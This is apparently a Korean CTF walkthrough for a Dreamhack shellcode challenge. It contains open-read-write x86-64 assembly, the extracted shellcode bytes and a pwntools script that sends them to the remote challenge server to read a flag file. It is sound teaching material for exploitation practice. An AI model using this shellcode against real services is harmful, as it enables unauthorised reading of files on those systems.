# 문제 풀이 방법
이번 워게임의 목표는 원격 서버의 `/home/shell_basic/flag_name_is_loooooong`에서 flag를 읽어오는 것이다.  
그런데 여기서 제공된 문제의 shell_basic.c 파일을 보면 execuve, execveat 시스템 콜을 사용하지 못하도록 막아놨기 때문에, orw 쉘코드를 통해 해당 flag를 읽어오면 된다. 

# 풀이 방법 1. c언어 skeleton 코드 이용

1. 먼저 orw 쉘 코드를 작성 후 skeleton 코드를 통해 실행 파일(ELF) 파일을 생성한다.
```
// File name: orw.c
// Compile Option: gcc -o orw orw.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    "xor rax, rax\n"
    "push rax\n"
    "mov rax, 0x676e6f6f6f6f6f6f\n"
    "push rax\n"
    "mov rax, 0x6c5f73695f656d61\n"
    "push rax\n"
    "mov rax, 0x6e5f67616c662f63\n"
    "push rax\n"
    "mov rax, 0x697361625f6c6c65\n"
    "push rax\n"
    "mov rax, 0x68732f656d6f682f\n"
    "push rax\n"

    "mov rdi, rsp\n"
    "xor rsi, rsi\n"
    "xor rdx, rdx\n"
    "mov rax, 0x02\n"
    "syscall\n"

    "mov rdi, rax\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30\n"
    "mov rdx, 0x30\n"
    "xor rax, rax\n"
    "syscall\n"

    "mov rdi, 0x1\n"
    "mov rax, 0x1\n"
    "syscall\n"

    "xor rdi, rdi   # rdi = 0\n"
    "mov rax, 0x3c  # rax = sys_exit\n"
    "syscall        # exit(0)"
);
void run_sh();
int main() { run_sh(); }
```

먼저 open콜에서 rsp에 문자열을 넣어준다. 여기서 리틀엔디언 저장 방식에 주의해주고, 맨 윗 줄에 push 0x0을 해준 이유는 기존 스택에서 문자열 이후에 저장된 값때매 정확히 문자열이 ng에서 끊기지 않을 수 있기 때문에 null 문자를 넣어주기 위함이다.
- 참고로 push 콜을 통해서는 최대 32비트 크기의 값밖에 못넣기 때문에 rax에 64비트 값을 먼저 mov 후 rax값을 push한다.

2. 차례대로 open, read, write 콜 이후 `rdi = 0x00(에러코드), rax = 0x3c`를 대입해 `exit(0)` 시스템 콜을 발생 후 종료한다.

3. 이후 `gcc -o  orw orw.c` 명령어를 통해 orw ELF 파일을 생성 후 `objdump -d orw`를 통해 orw의 디스어셈블(-d 옵션) 결과를 확인한다.
- objdump란, 쉽게 바이너리(ELF파일)의 정보를 보여주는 명령어라고 생각하면 됨

4. orw 파일은 순수 어셈블리어 파일(.asm)이 아니므로 위 3. 결과에서 우리가 필요한 <run_sh> 함수 부분의 기계어 코드만 추출할 수 있도록 한다. <img width="840" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/b853b579-a05c-4f6a-8f10-a75918fbcbd4">

5. 해당 부분을 opcode로 변경하기 위해,     
`for i in $(objdump -d orw | grep "" | cut -f 2); do echo -n \\x$i; done`를 통해 hex 형식으로 변환 후 우리가 필요한 <run_sh> 부분만 확인하여 복사한다.
- `for i in $( )` : $( ) 내의 명령을 실행한 값을 반복하여 i로 접근
- `objdump -d [file_path]` : [file] 경로의 오브젝트 파일을 기계어로 역어셈블
- `grep "^ "` : 공백으로 시작하는 문자열 탐색 (ELF파일에 기계어는 ^뒤에 있으므로)<img width="829" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/f56e9700-64ec-421b-82bf-6ec869e64427">

- `cut -f 2` : 문자열의 2번째 필드만 추출
- `do echo -n \\x$i` : “\x” + 변수 i 값을 줄바꿈 없이 출력
- `done` : 반복문 종료 

6. 이후 pwntools를 이용하여 실제 원격 서버에 공격을 위한 python 파일을 생성 후 공격한다.
```
from pwn import *

context.arch = "amd64"
p = remote("host3.dreamhack.games", 17846)

shellcode = b'\x48\x31\xc0\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\x48\xc7\xc2\x30\x00\x00\x00\x48\x31\xc0\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05'

p.sendlineafter('shellcode: ', shellcode)

print(p.recvuntil(b'}'))
```


